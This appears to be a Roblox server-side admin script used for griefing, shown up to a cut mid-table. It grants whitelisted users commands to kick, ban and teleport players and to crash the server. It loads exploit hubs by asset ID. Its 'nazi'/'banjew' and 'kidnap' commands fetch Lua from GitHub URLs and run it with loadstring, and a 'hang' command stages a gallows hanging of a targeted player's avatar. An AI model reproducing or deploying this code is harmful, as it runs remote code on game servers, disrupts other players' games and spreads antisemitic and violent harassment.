--// Settings
local Settings = {
	Prefix = "-";

	Whitelist = {
		"Di33le3", -- Add usernames here
		"neve11591",
		"SirKhalidBlox",
		"ripcxo",
		"RUBYMEEEEMEEE",
		"dhsjzjxhsjs"
	};

	DeadMansSwitch = false; -- If u get kicked or banned the server gets killed.
}

--// Internals
local Internals = {
	-- Commands / Toggles
	Commands = {};
	Chats = {};
	Banned = {"D_ionte"};
	Warned = {};
	Muted = {};
	Serverlock = false;
	-- Ui Elements
	Icons = {
		["Error"] = "rbxassetid://94362538974098",
		["Success"] = "rbxassetid://72024654106640",
		["Warn"] = "rbxassetid://108125574645285",
		["Info"] = "rbxassetid://103455396505678"
	};
	NsfwImages = {
		["Other"] = {
			{name = "Ass latex moment sigma sigma.exe", id = 7117887381, a = 0.732, x1 = 2.759, y1 = 1.515},
		},
	};

	Scripts = {
		Exser = {ID = "10868847330", Module = ":pls"};
		KasperUTG = {ID = "7993536803", Module = ".KasperUTGeditedByDog"}
	};
}

local Players = game.Players
local UserInputService = game:GetService("UserInputService")


local DIZZYFOLDER = Instance.new("Folder", game.ReplicatedStorage)
DIZZYFOLDER.Name = "DIZZYs Folder"

local BuildFolder = Instance.new("Folder", DIZZYFOLDER)
BuildFolder.Name = "DIZZYs Stored Builds Folder"


-- Loading ASSETS

require(128485735875466).DizzySSBuildLoad() -- Ferrari
require(123764473198037).DizzySSBuildLoad() -- Roblox Ball Gyro
require(74730262689062).DizzySSBuildLoad() -- Mclaren Sienna
require(91324836980339).DizzySSBuildLoad() -- Rimac Nevera
require(72122600693653).DizzySSBuildLoad() -- Bugatti Bolide
require(110485306545671).DizzySSBuildLoad() -- Koenigsegg Agera

require(128010285971411).DizzySSBuildLoad() -- Treehouse


--// Get Whitelist
function GetWhitelist()
	return Settings.Whitelist
end

--// Player Finder
function p(a, me)
	local ps = game.Players:GetPlayers()
	local found = {}

	if a:lower() == "me" then
		found = {me}
	elseif a:lower() == "others" then
		for i, player in ipairs(ps) do
			if player ~= me then
				table.insert(found, player)
			end
		end
	elseif a:lower() == "all" then
		found = ps
	elseif a:lower() == "random" then
		if #ps > 0 then
			found = {ps[math.random(1, #ps)]}
		end
	else
		for i, player in ipairs(ps) do
			if player.Name:lower():sub(1, #a) == a:lower() or player.DisplayName:lower():sub(1, #a) == a:lower() then
				table.insert(found, player)
			end
		end
	end

	return found
end

--// Add Command
local function addcmd(data)
	if Internals.Commands[data.Name] then return end
	if not data.Aliases then data.Aliases = {} end
	Internals.Commands[data.Name] = { Data = data }
end

--// Notification Function
function notif(plr, title, message, icon, duration)
	coroutine.wrap(function()
		if not plr or not plr:FindFirstChild("PlayerGui") then
			return
		end

		local NotificationUI = {
			["_NotificationsGui"] = Instance.new("ScreenGui");
			["_Frame"] = Instance.new("Frame");
			["_TextLabel"] = Instance.new("TextLabel");
			["_TextLabel1"] = Instance.new("TextLabel");
			["_ImageLabel"] = Instance.new("ImageLabel");
			["_UICorner"] = Instance.new("UICorner");
			["_ImageButton"] = Instance.new("ImageButton");
		}

		NotificationUI["_NotificationsGui"].Name = "NotificationsGui"
		NotificationUI["_NotificationsGui"].ResetOnSpawn = false
		NotificationUI["_NotificationsGui"].Parent = plr:FindFirstChild("PlayerGui")

		-- Main notification frame
		NotificationUI["_Frame"].BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		NotificationUI["_Frame"].BorderSizePixel = 0
		NotificationUI["_Frame"].ClipsDescendants = true
		NotificationUI["_Frame"].Size = UDim2.new(0, 178, 0, 65)
		NotificationUI["_Frame"].AnchorPoint = Vector2.new(1, 1) -- Aligns to the bottom-right corner
		NotificationUI["_Frame"].Position = UDim2.new(1.1, 0,0.84, 0) -- Starts off-screen
		NotificationUI["_Frame"].AnchorPoint = Vector2.new(0, 0)
		NotificationUI["_Frame"].Parent = NotificationUI["_NotificationsGui"]

		NotificationUI["_TextLabel"].Font = Enum.Font.GothamBold
		NotificationUI["_TextLabel"].Text = title
		NotificationUI["_TextLabel"].TextColor3 = Color3.fromRGB(255, 255, 255)
		NotificationUI["_TextLabel"].TextSize = 18
		NotificationUI["_TextLabel"].TextXAlignment = Enum.TextXAlignment.Left
		NotificationUI["_TextLabel"].BackgroundTransparency = 1
		NotificationUI["_TextLabel"].Position = UDim2.new(0, 36, 0, 2)
		NotificationUI["_TextLabel"].Size = UDim2.new(0.707865179, -10, 0, 25)
		NotificationUI["_TextLabel"].Parent = NotificationUI["_Frame"]

		NotificationUI["_TextLabel1"].Font = Enum.Font.Gotham
		NotificationUI["_TextLabel1"].Text = message
		NotificationUI["_TextLabel1"].TextColor3 = Color3.fromRGB(200, 200, 200)
		NotificationUI["_TextLabel1"].TextSize = 14
		NotificationUI["_TextLabel1"].TextWrapped = true
		NotificationUI["_TextLabel1"].TextXAlignment = Enum.TextXAlignment.Left
		NotificationUI["_TextLabel1"].TextYAlignment = Enum.TextYAlignment.Top
		NotificationUI["_TextLabel1"].BackgroundTransparency = 1
		NotificationUI["_TextLabel1"].Position = UDim2.new(0.05, 0, 0.4, 0)
		NotificationUI["_TextLabel1"].Size = UDim2.new(0.9, 0, 0.5, 0)
		NotificationUI["_TextLabel1"].Parent = NotificationUI["_Frame"]

		NotificationUI["_ImageLabel"].Image = icon
		NotificationUI["_ImageLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		NotificationUI["_ImageLabel"].BorderSizePixel = 0
		NotificationUI["_ImageLabel"].BackgroundTransparency = 1
		NotificationUI["_ImageLabel"].Position = UDim2.new(0.0505621396, 0, 0.0923076943, 0)
		NotificationUI["_ImageLabel"].Size = UDim2.new(0, 17, 0, 17)
		NotificationUI["_ImageLabel"].Parent = NotificationUI["_Frame"]

		NotificationUI["_UICorner"].CornerRadius = UDim.new(0, 6)
		NotificationUI["_UICorner"].Parent = NotificationUI["_Frame"]

		NotificationUI["_ImageButton"].Image = "http://www.roblox.com/asset/?id=15112972490"
		NotificationUI["_ImageButton"].BackgroundTransparency = 1
		NotificationUI["_ImageButton"].Position = UDim2.new(0.870000005, 0, 0.083076943, 0)
		NotificationUI["_ImageButton"].Size = UDim2.new(0, 20, 0, 20)
		NotificationUI["_ImageButton"].Parent = NotificationUI["_Frame"]

		NotificationUI["_ImageButton"].MouseButton1Click:Connect(function()
			NotificationUI["_Frame"]:TweenPosition(UDim2.new(1.1, 0, 0.84, 0), "Out", "Quad", 0.5, true)
			task.wait(0.5)
			NotificationUI["_NotificationsGui"]:Destroy()
		end)

		NotificationUI["_Frame"]:TweenPosition(UDim2.new(0.85, 0,0.84, 0), "Out", "Quad", 0.5, true)

		task.wait(duration or 5)

		NotificationUI["_Frame"]:TweenPosition(UDim2.new(1.1, 0, 0.84, 0), "Out", "Quad", 0.5, true)

		task.wait(0.45)
		NotificationUI["_NotificationsGui"]:Destroy()
	end)()
end

local function announce(player, message)
	local AnnouncementUI = {
		["_AnnouncementUI"] = Instance.new("ScreenGui"),
		["_Frame"] = Instance.new("Frame"),
		["_TextLabel"] = Instance.new("TextLabel"),
		["_TextLabel1"] = Instance.new("TextLabel"),
		["_ImageButton"] = Instance.new("ImageButton"),
		["_UICorner"] = Instance.new("UICorner"),
		["_ImageLabel"] = Instance.new("ImageLabel"),
	}

	AnnouncementUI["_AnnouncementUI"].Name = "AnnouncementUI"
	AnnouncementUI["_AnnouncementUI"].Parent = player:WaitForChild("PlayerGui")

	AnnouncementUI["_Frame"].BackgroundColor3 = Color3.fromRGB(20,20,20)
	AnnouncementUI["_Frame"].BorderSizePixel = 0
	AnnouncementUI["_Frame"].ClipsDescendants = true
	AnnouncementUI["_Frame"].Position = UDim2.new(0.5, -200, 1.5, -100)
	AnnouncementUI["_Frame"].Size = UDim2.new(0, 400, 0, 200)
	AnnouncementUI["_Frame"].Parent = AnnouncementUI["_AnnouncementUI"]

	AnnouncementUI["_TextLabel"].Font = Enum.Font.Gotham
	AnnouncementUI["_TextLabel"].Text = message
	AnnouncementUI["_TextLabel"].TextColor3 = Color3.fromRGB(200, 200, 200)
	AnnouncementUI["_TextLabel"].TextSize = 16
	AnnouncementUI["_TextLabel"].TextWrapped = true
	AnnouncementUI["_TextLabel"].TextXAlignment = Enum.TextXAlignment.Left
	AnnouncementUI["_TextLabel"].TextYAlignment = Enum.TextYAlignment.Top
	AnnouncementUI["_TextLabel"].BackgroundTransparency = 1
	AnnouncementUI["_TextLabel"].Position = UDim2.new(0, 10, 0, 50)
	AnnouncementUI["_TextLabel"].Size = UDim2.new(1, -20, 1, -60)
	AnnouncementUI["_TextLabel"].Parent = AnnouncementUI["_Frame"]

	AnnouncementUI["_TextLabel1"].Font = Enum.Font.GothamBold
	AnnouncementUI["_TextLabel1"].Text = "DIZZY's Admin Announcement"
	AnnouncementUI["_TextLabel1"].TextColor3 = Color3.fromRGB(255, 255, 255)
	AnnouncementUI["_TextLabel1"].TextSize = 20
	AnnouncementUI["_TextLabel1"].TextXAlignment = Enum.TextXAlignment.Left
	AnnouncementUI["_TextLabel1"].BackgroundTransparency = 1
	AnnouncementUI["_TextLabel1"].Position = UDim2.new(0, 61, 0, 0)
	AnnouncementUI["_TextLabel1"].Size = UDim2.new(0.869999826, -10, 0.165000051, 0)
	AnnouncementUI["_TextLabel1"].Parent = AnnouncementUI["_Frame"]

	AnnouncementUI["_ImageButton"].Image = "http://www.roblox.com/asset/?id=15112972490"
	AnnouncementUI["_ImageButton"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	AnnouncementUI["_ImageButton"].BackgroundTransparency = 1
	AnnouncementUI["_ImageButton"].BorderSizePixel = 0
	AnnouncementUI["_ImageButton"].Position = UDim2.new(0.922499895, 0, 0.00699996948, 0)
	AnnouncementUI["_ImageButton"].Size = UDim2.new(0, 30, 0, 30)
	AnnouncementUI["_ImageButton"].Parent = AnnouncementUI["_Frame"]

	AnnouncementUI["_UICorner"].CornerRadius = UDim.new(0, 4)
	AnnouncementUI["_UICorner"].Parent = AnnouncementUI["_Frame"]

	AnnouncementUI["_ImageLabel"].Image = "rbxassetid://111143570399826"
	AnnouncementUI["_ImageLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	AnnouncementUI["_ImageLabel"].BackgroundTransparency = 1
	AnnouncementUI["_ImageLabel"].Position = UDim2.new(0.0230621342, 0, 0.00730766309, 0)
	AnnouncementUI["_ImageLabel"].Size = UDim2.new(0, 30, 0, 30)
	AnnouncementUI["_ImageLabel"].Parent = AnnouncementUI["_Frame"]


	AnnouncementUI._ImageButton.MouseButton1Click:Connect(function()
		AnnouncementUI._Frame:TweenPosition(UDim2.new(0.5, -200, 1.5, -100), "Out", "Quad", 0.5, true)
		task.wait(0.5)
		AnnouncementUI._AnnouncementUI:Destroy()
	end)

	AnnouncementUI._Frame:TweenPosition(UDim2.new(0.5, -200, 0.5, -100), "Out", "Quad", 0.5, true)

	task.wait(6)
	AnnouncementUI._Frame:TweenPosition(UDim2.new(0.5, -200, 1.5, -100), "Out", "Quad", 0.5, true)

	task.wait(0.5)
	AnnouncementUI._AnnouncementUI:Destroy()
end










-------------------------------

--// Commands
addcmd({
	Name = "kick",
	Aliases = {"k"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr ~= sender then -- Prevent kicking yourself
				plr:Kick(arguments and "You have been kicked for: " .. table.concat(arguments, " ") or "You have been kicked.")
			else
				notif(sender, "Error", "You cannot kick yourself.", Internals.Icons.Error)
			end
		end
	end
})

game.Players.PlayerAdded:Connect(function(plr)
	if table.find(Internals.Banned, plr.UserId) then
		plr:Kick("You are permanently banned.")
	end
end)

addcmd({
	Name = "ban",
	Aliases = {"b"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr ~= sender then
				if not table.find(Internals.Banned, plr.UserId) then
					table.insert(Internals.Banned, plr.UserId)
				end
				plr:Kick(arguments and "You have been banned for: " .. table.concat(arguments, " ") or "You have been banned.")
			else
				notif(sender, "Error", "You cannot ban yourself.", Internals.Icons.Error)
			end
		end
	end
})

addcmd({
	Name = "bring",
	Aliases = {"tome"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				plr.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	end
})

addcmd({
	Name = "goto",
	Aliases = {"to"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 4.5)
			end
		end
	end
})

addcmd({
	Name = "nazi",
	Aliases = {"nozo","nozi", "banjew"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then

				_G.Victim = plr.Name

				local success, result = pcall(function()
					return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/Open-Cor3/DizzyAdmin/refs/heads/main/Assets/BuildNaozi")
				end)

				if success then
					local content = result
					local loaded, fail = loadstring(content)
					if loaded then
						loaded()

						task.wait(2)

						local naziModel = game.Workspace:FindFirstChild("Nazi")
						local victimChar = plr.Character

						if naziModel and victimChar then
							local victimTorso = victimChar:FindFirstChild("Torso")
							if victimTorso then
								naziModel:SetPrimaryPartCFrame(victimTorso.CFrame * CFrame.new(10, 0, 0))
							end
						end
					else
						notif(sender, "DIZZY's admin", "Failed to load the clown van", Internals.Icons.Error)
					end
				else
					notif(sender, "DIZZY's admin", "Failed to load the clown van", Internals.Icons.Error)
				end
			end
		end
	end
})




addcmd({
	Name = "admin",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not table.find(Settings.Whitelist, plr.Name) then
				table.insert(Settings.Whitelist, plr.Name)
				notif(plr, "Admin", "You have been granted admin privileges.", Internals.Icons.Info)
			end
		end
	end
})

addcmd({
	Name = "unadmin",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(Settings.Whitelist, plr.Name) then
				table.remove(Settings.Whitelist, table.find(Settings.Whitelist, plr.Name))
				notif(plr, "Admin", "Your admin privileges have been revoked.", Internals.Icons.Warn)
			end
		end
	end
})



addcmd({
	Name = "warn",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(Internals.Warned, plr.Name) then
				table.insert(Internals.Warned, table.find(Internals.Warned, plr.Name))
				notif(targets, "Admin", "You have been warned for "..table.concat(arguments, " "), Internals.Icons.Warn)
			end
		end
	end
})

addcmd({
	Name = "deadswitch",
	Aliases = {"deadmans"},
	Function = function(sender, targets, arguments)
		Settings.DeadMansSwitch = true
		for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
			coroutine.wrap(function()
				announce(player, "Dead Man's Switch Activated! If " .. sender.Name .. " is kicked, banned or has left, the server will crash.")
			end)()
		end

		while Settings.DeadMansSwitch do
			local playerFound = false
			for _, player in ipairs(game.Players:GetPlayers()) do
				if player.Name == sender.Name then
					playerFound = true
					break
				end
			end

			if not playerFound then
				for _, player in ipairs(game.Players:GetPlayers()) do
					player:Kick("Dead Man's Switch Activated: " .. sender.Name .. " has been kicked or banned.")
				end
				Settings.DeadMansSwitch = false
				break
			end
			task.wait(0.2)
		end
	end
})

addcmd({
	Name = "undeadswitch",
	Aliases = {"undeadmans"},
	Function = function(sender, targets, arguments)
		Settings.DeadMansSwitch = false
		for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
			coroutine.wrap(function()
				announce(player, "Dead Man's Switch Deactivated by " .. sender.Name)
			end)()
		end
	end
})



addcmd({
	Name = "unload",
	Aliases = {},
	Function = function(sender, targets, arguments)
		script:Destroy()
	end
})

addcmd({
	Name = "hang",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Torso") then

				local floor = Instance.new("Part", workspace)
				floor.Name = "cxo was here"
				floor.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, -2.5 , 0)
				floor.Material = Enum.Material.Wood
				floor.BrickColor = BrickColor.new("Rust")
				floor.Size = Vector3.new(16, 1, 16)
				floor.Anchored = true

				local pole = Instance.new("Part", workspace)
				pole.Name = "cxo was here"
				pole.CFrame = floor.CFrame * CFrame.new(0, 6.5, 7)
				pole.Material = Enum.Material.Wood
				pole.BrickColor = BrickColor.new("Rust")
				pole.Size = Vector3.new(2, 12, 2)
				pole.Anchored = true

				local pole2 = Instance.new("Part", workspace)
				pole2.Name = "cxo was here"
				pole2.CFrame = pole.CFrame * CFrame.new(0, 6.5, -2)
				pole2.Material = Enum.Material.Wood
				pole2.BrickColor = BrickColor.new("Rust")
				pole2.Size = Vector3.new(2, 1, 6)
				pole2.Anchored = true

				local metal = Instance.new("Part", workspace)
				metal.Name = "cxo was here"
				metal.CFrame = pole.CFrame * CFrame.new(0, 7.05, -4)
				metal.Material = Enum.Material.DiamondPlate
				metal.BrickColor = BrickColor.new("Black")
				metal.Size = Vector3.new(2, 0.1, 0.1)
				metal.Anchored = true

				local metal2 = Instance.new("Part", workspace)
				metal2.Name = "cxo was here"
				metal2.CFrame = metal.CFrame * CFrame.new(-1.05, -0.56, 0)
				metal2.Material = Enum.Material.DiamondPlate
				metal2.BrickColor = BrickColor.new("Black")
				metal2.Size = Vector3.new(0.1, 1.213, 0.1)
				metal2.Anchored = true

				local metal3 = Instance.new("Part", workspace)
				metal3.Name = "cxo was here"
				metal3.CFrame = metal.CFrame * CFrame.new(1.05, -0.56, 0)
				metal3.Material = Enum.Material.DiamondPlate
				metal3.BrickColor = BrickColor.new("Black")
				metal3.Size = Vector3.new(0.1, 1.213, 0.1)
				metal3.Anchored = true

				local metal4 = Instance.new("Part", workspace)
				metal4.Name = "cxo was here"
				metal4.CFrame = pole.CFrame * CFrame.new(0, 5.93, -4)
				metal4.Material = Enum.Material.DiamondPlate
				metal4.BrickColor = BrickColor.new("Black")
				metal4.Size = Vector3.new(2, 0.1, 0.1)
				metal4.Anchored = true

				local rope = Instance.new("Part", workspace)
				rope.Name = "cxo was here"
				rope.CFrame = metal4.CFrame * CFrame.new(0, -0.60, 0)
				rope.Material = Enum.Material.Leather
				rope.BrickColor = BrickColor.new("Burnt Sienna")
				rope.Size = Vector3.new(0.1, 1.113, 0.1)
				rope.Anchored = true

				local rope2 = Instance.new("Part", workspace)
				rope2.Name = "cxo was here"
				rope2.CFrame = rope.CFrame * CFrame.new(0, -0.6, 0)
				rope2.Material = Enum.Material.Leather
				rope2.BrickColor = BrickColor.new("Burnt Sienna")
				rope2.Size = Vector3.new(1.459, 0.1, 0.1)
				rope2.Anchored = true

				local rope3 = Instance.new("Part", workspace)
				rope3.Name = "cxo was here"
				rope3.CFrame = rope2.CFrame * CFrame.new(0.78, -0.5560, 0)
				rope3.Material = Enum.Material.Leather
				rope3.BrickColor = BrickColor.new("Burnt Sienna")
				rope3.Size = Vector3.new(0.1, 1.215, 0.1)
				rope3.Anchored = true

				local rope4 = Instance.new("Part", workspace)
				rope4.Name = "cxo was here"
				rope4.CFrame = rope2.CFrame * CFrame.new(-0.78, -0.5560, 0)
				rope4.Material = Enum.Material.Leather
				rope4.BrickColor = BrickColor.new("Burnt Sienna")
				rope4.Size = Vector3.new(0.1, 1.215, 0.1)
				rope4.Anchored = true

				local rope5 = Instance.new("Part", workspace)
				rope5.Name = "cxo was here"
				rope5.CFrame = rope.CFrame * CFrame.new(0, -1.715, 0)
				rope5.Material = Enum.Material.Leather
				rope5.BrickColor = BrickColor.new("Burnt Sienna")
				rope5.Size = Vector3.new(1.459, 0.1, 0.1)
				rope5.Anchored = true

				plr.Character.Head.CFrame = rope5.CFrame * CFrame.new(0, 1 , 0.5)
				plr.Character.HumanoidRootPart.Anchored = true
				plr.Character.Humanoid.Animator:Destroy()
				plr.Character.Torso.Neck.C0 = plr.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(90), 0, 0)
			end
		end
	end
})

addcmd({
	Name = "kidnap",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then

				_G.Victim = plr.Name

				local success, result = pcall(function() -- clown van script
					return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/clownvan")
				end)

				if success then
					local content = result
					local loaded, fail = loadstring(content)
					if loaded then
						loaded()
					else
						notif(sender, "DIZZY's admin", "Failed to load the clown van", Internals.Icons.Error)
					end
				else
					notif(sender, "DIZZY's admin", "Failed to load the clown van", Internals.Icons.Error)
				end

			end

		end
	end
})

addcmd({
	Name = "supercar",
	Aliases = {"ferrari", "ferr"},
	Function = function(sender, targets, arguments)
		local rs = game:GetService("ReplicatedStorage")
		local dizzyFolder = rs:FindFirstChild("DIZZYs Folder")
		local storedBuilds = dizzyFolder and dizzyFolder:FindFirstChild("DIZZYs Stored Builds Folder")
		local supercar = storedBuilds and storedBuilds:FindFirstChild("Ferrari")

		if not supercar then
			local success, result = pcall(function()
				return require(128485735875466).DizzySSBuildLoad()
			end)

			if success then
				repeat task.wait() until rs:FindFirstChild("Supercar")
				rs.Supercar.Parent = dizzyFolder
				supercar = storedBuilds and storedBuilds:FindFirstChild("Supercar")
			else
				return notif(sender, "DIZZY's Admin", "Supercar failed to load: " .. result, Internals.Icons.Error)
			end
		end

		if supercar then
			local carClone = supercar:Clone()
			carClone.PrimaryPart = carClone:FindFirstChild("DriveSeat")
			carClone.Parent = workspace
			carClone:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
		end
	end
})


addcmd({
	Name = "supercar2",
	Aliases = {"mclaren", "sienna"},
	Function = function(sender, targets, arguments)
		local rs = game:GetService("ReplicatedStorage")
		local dizzyFolder = rs:FindFirstChild("DIZZYs Folder")
		local storedBuilds = dizzyFolder and dizzyFolder:FindFirstChild("DIZZYs Stored Builds Folder")
		local supercar = storedBuilds and storedBuilds:FindFirstChild("McLarenSenna")

		if not supercar then
			local success, result = pcall(function()
				return require(74730262689062).DizzySSBuildLoad()
			end)

			if success then
				repeat task.wait() until rs:FindFirstChild("Supercar")
				rs.Supercar.Parent = dizzyFolder
				supercar = storedBuilds and storedBuilds:FindFirstChild("Supercar")
			else
				return notif(sender, "DIZZY's Admin", "Supercar failed to load: " .. result, Internals.Icons.Error)
			end
		end

		if supercar then
			local carClone = supercar:Clone()
			carClone.PrimaryPart = carClone:FindFirstChild("DriveSeat")
			carClone.Parent = workspace
			carClone:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
		end
	end
})

addcmd({
	Name = "supercar3",
	Aliases = {"rimac", "nevera"},
	Function = function(sender, targets, arguments)
		local rs = game:GetService("ReplicatedStorage")
		local dizzyFolder = rs:FindFirstChild("DIZZYs Folder")
		local storedBuilds = dizzyFolder and dizzyFolder:FindFirstChild("DIZZYs Stored Builds Folder")
		local supercar = storedBuilds and storedBuilds:FindFirstChild("RmacNeveraConcept2")

		if not supercar then
			local success, result = pcall(function()
				return require(91324836980339).DizzySSBuildLoad()
			end)

			if success then
				repeat task.wait() until rs:FindFirstChild("Supercar")
				rs.Supercar.Parent = dizzyFolder
				supercar = storedBuilds and storedBuilds:FindFirstChild("Supercar")
			else
				return notif(sender, "DIZZY's Admin", "Supercar failed to load: " .. result, Internals.Icons.Error)
			end
		end

		if supercar then
			local carClone = supercar:Clone()
			carClone.PrimaryPart = carClone:FindFirstChild("DriveSeat")
			carClone.Parent = workspace
			carClone:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
		end
	end
})

addcmd({
	Name = "supercar4",
	Aliases = {"bugatti", "bolide"},
	Function = function(sender, targets, arguments)
		local rs = game:GetService("ReplicatedStorage")
		local dizzyFolder = rs:FindFirstChild("DIZZYs Folder")
		local storedBuilds = dizzyFolder and dizzyFolder:FindFirstChild("DIZZYs Stored Builds Folder")
		local supercar = storedBuilds and storedBuilds:FindFirstChild("BugattiBolide")

		if not supercar then
			local success, result = pcall(function()
				return require(72122600693653).DizzySSBuildLoad()
			end)

			if success then
				repeat task.wait() until rs:FindFirstChild("Supercar")
				rs.Supercar.Parent = dizzyFolder
				supercar = storedBuilds and storedBuilds:FindFirstChild("Supercar")
			else
				return notif(sender, "DIZZY's Admin", "Supercar failed to load: " .. result, Internals.Icons.Error)
			end
		end

		if supercar then
			local carClone = supercar:Clone()
			carClone.PrimaryPart = carClone:FindFirstChild("DriveSeat")
			carClone.Parent = workspace
			carClone:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
		end
	end
})


addcmd({
	Name = "supercar5",
	Aliases = {"koenigsegg", "agera"},
	Function = function(sender, targets, arguments)
		local rs = game:GetService("ReplicatedStorage")
		local dizzyFolder = rs:FindFirstChild("DIZZYs Folder")
		local storedBuilds = dizzyFolder and dizzyFolder:FindFirstChild("DIZZYs Stored Builds Folder")
		local supercar = storedBuilds and storedBuilds:FindFirstChild("KoenigseggAgera")

		if not supercar then
			local success, result = pcall(function()
				return require(110485306545671).DizzySSBuildLoad()
			end)

			if success then
				repeat task.wait() until rs:FindFirstChild("Supercar")
				rs.Supercar.Parent = dizzyFolder
				supercar = storedBuilds and storedBuilds:FindFirstChild("Supercar")
			else
				return notif(sender, "DIZZY's Admin", "Supercar failed to load: " .. result, Internals.Icons.Error)
			end
		end

		if supercar then
			local carClone = supercar:Clone()
			carClone.PrimaryPart = carClone:FindFirstChild("DriveSeat")
			carClone.Parent = workspace
			carClone:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
		end
	end
})


addcmd({
	Name = "ball",
	Aliases = {"gyroball", "ballcar"},
	Function = function(sender, targets, arguments)
		local rs = game:GetService("ReplicatedStorage")
		local dizzyFolder = rs:FindFirstChild("DIZZYs Folder")
		local storedBuilds = dizzyFolder and dizzyFolder:FindFirstChild("DIZZYs Stored Builds Folder")
		local supercar = storedBuilds and storedBuilds:FindFirstChild("Ball")

		if not supercar then
			local success, result = pcall(function()
				return require(123764473198037).DizzySSBuildLoad() -- Roblox Ball Gyro
			end)

			if success then
				repeat task.wait() until rs:FindFirstChild("Supercar")
				rs.Supercar.Parent = dizzyFolder
				supercar = storedBuilds and storedBuilds:FindFirstChild("Supercar")
			else
				return notif(sender, "DIZZY's Admin", "Ball Gyro failed to load: " .. result, Internals.Icons.Error)
			end
		end

		if supercar then
			local carClone = supercar:Clone()
			carClone.PrimaryPart = carClone:FindFirstChild("DriverSeat")
			carClone.Parent = workspace
			carClone:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
		end
	end
})


addcmd({
	Name = "treehouse",
	Aliases = {"buildload1"},
	Function = function(sender, targets, arguments)
		local rs = game:GetService("ReplicatedStorage")
		local dizzyFolder = rs:FindFirstChild("DIZZYs Folder")
		local storedBuilds = dizzyFolder and dizzyFolder:FindFirstChild("DIZZYs Stored Builds Folder")
		local build = storedBuilds and storedBuilds:FindFirstChild("Treehouse")

		if not build then
			local success, result = pcall(function()
				return require(128010285971411).DizzySSBuildLoad()
			end)

			if success then
				repeat task.wait() until rs:FindFirstChild("Supercar")
				rs.Supercar.Parent = dizzyFolder
				build = storedBuilds and storedBuilds:FindFirstChild("Supercar")
			else
				return notif(sender, "DIZZY's Admin", "Treehouse failed to load: " .. result, Internals.Icons.Error)
			end
		end

		if build then
			local BuildClone = build:Clone()
			BuildClone.Parent = workspace
			BuildClone.PrimaryPart = BuildClone:FindFirstChild("Trunk")
			BuildClone:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-30, 45, -30))
		end
	end
})



addcmd({
	Name = "exser",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local success, fail = pcall(function()
			require(10868847330):pls(sender.Name)
		end)

		if success then
			task.spawn(function()
				task.wait(1)
				notif(sender, "Exser", "The hub password is c00lkidds", Internals.Icons.Info)
			end)
		else
			notif(sender, "Exser", "Failed to load: ".. fail, Internals.Icons.Error)
		end
	end
})

addcmd({
	Name = "sensation",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local success, fail = pcall(function()
			require(100263845596551)(sender.Name, ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")
		end)

		if success then
			task.spawn(function()
				task.wait(1)
				notif(sender, "Sensation Hub", "Loaded Sensation Hub.", Internals.Icons.Info)
			end)
		else
			notif(sender, "Sensation Hub", "Failed to load: ".. fail, Internals.Icons.Error)
		end
	end
})

addcmd({
	Name = "scripts",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local ScriptsUI = {
			["_ScriptsUi"] = Instance.new("ScreenGui");
			["_Frame"] = Instance.new("Frame");
			["_ScrollingFrame"] = Instance.new("ScrollingFrame");
			["_UIListLayout"] = Instance.new("UIListLayout");
			["_UICorner2"] = Instance.new("UICorner");
			["_ImageButton"] = Instance.new("ImageButton");
			["_TextLabel1"] = Instance.new("TextLabel");
			["_ImageLabel"] = Instance.new("ImageLabel");
			["_Sbar"] = Instance.new("Frame");
			["_TextLabel2"] = Instance.new("TextLabel");
			["_UICorner3"] = Instance.new("UICorner");
